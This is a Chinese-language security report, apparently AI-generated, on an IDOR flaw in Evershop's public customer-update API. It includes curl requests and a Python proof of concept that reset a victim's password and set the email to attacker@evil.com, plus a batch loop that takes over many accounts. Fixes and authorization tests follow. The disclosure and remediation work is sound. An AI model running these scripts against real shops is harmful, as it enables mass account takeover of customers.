# Evershop updateCustomer 不安全直接对象引用(IDOR)漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：不安全的直接对象引用 (IDOR, CWE-639)
- **漏洞名称**：Evershop updateCustomer API 未授权修改任意用户信息漏洞
- **风险等级**：高危
- **概述**：`PATCH /customers/:id` API 端点被配置为公开访问（`access="public"`），且在Handler中仅验证目标用户UUID是否存在，未验证请求者是否为该用户本人。攻击者可通过遍历或猜测用户UUID，修改任意用户的密码、邮箱等敏感信息，导致账户接管。

### 2.2 利用前提与特征

- **利用难度**：低
- **权限要求**：无需认证
- **操作条件**：
  1. 获取目标用户的UUID（可通过其他信息泄露漏洞或枚举获取）
  2. 能够发送HTTP PATCH请求
- **攻击复杂度**：UUID为32位十六进制字符串，直接枚举不现实，但可通过以下方式获取：
  - 前端页面源码泄露
  - API响应中包含其他用户UUID
  - 订单、地址等关联数据中的用户ID

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **账户接管**：修改目标用户密码后，攻击者可直接登录该账户
2. **邮箱劫持**：修改用户邮箱为攻击者控制的邮箱，用于后续密码重置
3. **个人信息篡改**：修改用户姓名、联系方式等信息
4. **业务影响**：影响用户正常使用，损害平台信誉

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：确认路由配置**

文件：`packages/evershop/src/modules/customer/api/updateCustomer/route.json`
```json
{
  "methods": ["PATCH"],
  "path": "/customers/:id",
  "access": "public"  // <-- 无需认证！
}
```

**步骤2：分析Handler逻辑**

文件：`packages/evershop/src/modules/customer/api/updateCustomer/updateCustomer.js`
```javascript
export default async (request, response, next) => {
  const connection = await getConnection();
  try {
    // 仅检查UUID是否存在，未验证所有权
    const customer = await select()
      .from('customer')
      .where('uuid', '=', request.params.id)  // 用户可控
      .load(connection, false);

    if (!customer) {
      response.status(INVALID_PAYLOAD);
      response.json({ error: { message: 'Invalid customer id' }});
      return;
    }

    // 密码哈希处理
    if (request.body.password) {
      request.body.password = hashPassword(request.body.password);
    }

    // 直接更新，无所有权验证！
    await update('customer')
      .given({
        ...request.body,  // 用户输入直接展开
        group_id: 1
      })
      .where('uuid', '=', request.params.id)
      .execute(connection, false);
    // ...
  }
};
```

**步骤3：发送攻击请求**

```bash
# 修改任意用户密码
curl -X PATCH 'https://target.com/api/customers/a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6' \
  -H 'Content-Type: application/json' \
  -d '{
    "password": "attacker_new_password",
    "email": "attacker@evil.com"
  }'
```

**步骤4：验证攻击成功**

使用新密码登录目标用户账户：
```bash
curl -X POST 'https://target.com/api/customer/tokens' \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "victim@example.com",
    "password": "attacker_new_password"
  }'
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 自动化利用脚本

```python
#!/usr/bin/env python3
"""
Evershop IDOR PoC - Account Takeover via updateCustomer
"""

import requests
import sys

def exploit_idor(target_url, victim_uuid, new_password, new_email=None):
    """
    修改任意用户的密码和邮箱
    """
    endpoint = f"{target_url}/api/customers/{victim_uuid}"

    payload = {
        "password": new_password
    }

    if new_email:
        payload["email"] = new_email

    headers = {
        "Content-Type": "application/json"
    }

    print(f"[*] 攻击目标: {endpoint}")
    print(f"[*] 新密码: {new_password}")

    response = requests.patch(endpoint, json=payload, headers=headers)

    if response.status_code == 200:
        print("[+] 攻击成功! 用户密码已被修改")
        print(f"[+] 响应: {response.json()}")
        return True
    else:
        print(f"[-] 攻击失败: {response.status_code}")
        print(f"[-] 响应: {response.text}")
        return False


def verify_takeover(target_url, email, password):
    """
    验证账户接管是否成功
    """
    endpoint = f"{target_url}/api/customer/tokens"

    payload = {
        "email": email,
        "password": password
    }

    response = requests.post(endpoint, json=payload)

    if response.status_code == 200 and "token" in response.text:
        print("[+] 账户接管验证成功!")
        return True
    else:
        print("[-] 账户接管验证失败")
        return False


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target_url> <victim_uuid> <new_password> [new_email]")
        print(f"Example: {sys.argv[0]} https://shop.example.com abc123 hackedpass attacker@evil.com")
        sys.exit(1)

    target = sys.argv[1]
    uuid = sys.argv[2]
    password = sys.argv[3]
    email = sys.argv[4] if len(sys.argv) > 4 else None

    exploit_idor(target, uuid, password, email)
```

### 4.2 批量用户枚举利用

```python
def enumerate_and_exploit(target_url, uuid_list_file, new_password):
    """
    批量修改用户密码
    """
    with open(uuid_list_file, 'r') as f:
        uuids = [line.strip() for line in f if line.strip()]

    success_count = 0
    for uuid in uuids:
        if exploit_idor(target_url, uuid, new_password):
            success_count += 1

    print(f"\n[*] 总计: {len(uuids)} 个用户, 成功: {success_count} 个")
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│                  IDOR 漏洞数据流                                │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  HTTP请求: PATCH /customers/:id                                │
│  路由配置: access="public"  ← 无需认证                          │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 中间件链                                 │                  │
│  │ 1. bodyParser - 解析JSON                │                  │
│  │ 2. auth.ts - 检查access                 │                  │
│  │    if (access === 'public') next();     │   ← 直接放行     │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ updateCustomer.js Handler               │                  │
│  │                                         │                  │
│  │ 1. request.params.id  ← 攻击者可控UUID   │                  │
│  │           │                             │                  │
│  │           ▼                             │                  │
│  │ 2. select().where('uuid', '=', id)      │                  │
│  │    → 仅检查用户是否存在                  │                  │
│  │    → ❌ 未验证请求者身份                 │                  │
│  │    → ❌ 未验证资源所有权                 │                  │
│  │           │                             │                  │
│  │           ▼                             │                  │
│  │ 3. update('customer').given(req.body)   │                  │
│  │    → 修改任意用户数据!                   │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **路由配置错误**：敏感操作API被配置为 `access="public"`
2. **缺失所有权验证**：Handler仅验证资源存在性，未验证请求者是否为资源所有者
3. **认证与授权混淆**：系统将"无需登录"等同于"无需权限控制"

### 5.3 安全模型缺陷

```
正确的访问控制模型:
┌─────────────┬─────────────┬─────────────┐
│   L1层      │    L2层     │    L3层     │
│ 路由认证    │  身份验证   │  资源所有权  │
├─────────────┼─────────────┼─────────────┤
│ access配置  │ 获取当前用户 │ 验证user_id │
│ public/     │ session/JWT │ 匹配        │
│ private     │             │             │
└─────────────┴─────────────┴─────────────┘

Evershop当前实现:
- L1层: access="public" → 跳过L2和L3
- L2层: 公开路由不执行
- L3层: 未实现
```

## 6. 修复建议

### 6.1 立即修复方案

**方案A：修改路由为私有（推荐）**

修改 `route.json`：
```json
{
  "methods": ["PATCH"],
  "path": "/customers/:id",
  "access": "private"  // 改为需要认证
}
```

**方案B：在Handler中添加所有权验证**

修改 `updateCustomer.js`：
```javascript
export default async (request, response, next) => {
  const connection = await getConnection();
  try {
    // 1. 获取当前登录用户
    const currentCustomer = request.getCurrentCustomer();
    if (!currentCustomer) {
      response.status(UNAUTHORIZED);
      response.json({ error: { message: 'Authentication required' }});
      return;
    }

    // 2. 验证所有权
    if (currentCustomer.uuid !== request.params.id) {
      response.status(FORBIDDEN);
      response.json({ error: { message: 'You can only update your own profile' }});
      return;
    }

    // 3. 原有逻辑...
    const customer = await select()
      .from('customer')
      .where('uuid', '=', request.params.id)
      .load(connection, false);
    // ...
  }
};
```

### 6.2 防御纵深建议

1. **敏感字段保护**：
```javascript
// 禁止修改某些敏感字段
const PROTECTED_FIELDS = ['status', 'group_id', 'created_at'];
Object.keys(request.body).forEach(key => {
  if (PROTECTED_FIELDS.includes(key)) {
    delete request.body[key];
  }
});
```

2. **密码修改单独处理**：
```javascript
// 密码修改应要求当前密码验证
if (request.body.password) {
  if (!request.body.currentPassword) {
    return response.status(400).json({
      error: { message: 'Current password required' }
    });
  }
  // 验证当前密码...
}
```

3. **审计日志**：
```javascript
// 记录敏感操作
await logActivity({
  action: 'customer_update',
  actor: currentCustomer.uuid,
  target: request.params.id,
  changes: Object.keys(request.body),
  ip: request.ip
});
```

### 6.3 安全测试用例

```javascript
describe('updateCustomer Authorization', () => {
  it('should reject unauthenticated requests', async () => {
    const response = await request(app)
      .patch('/api/customers/some-uuid')
      .send({ password: 'newpass' });
    expect(response.status).toBe(401);
  });

  it('should reject updating other users', async () => {
    const response = await request(app)
      .patch('/api/customers/other-user-uuid')
      .set('Authorization', `Bearer ${userToken}`)
      .send({ password: 'newpass' });
    expect(response.status).toBe(403);
  });

  it('should allow updating own profile', async () => {
    const response = await request(app)
      .patch(`/api/customers/${currentUser.uuid}`)
      .set('Authorization', `Bearer ${userToken}`)
      .send({ full_name: 'New Name' });
    expect(response.status).toBe(200);
  });
});
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
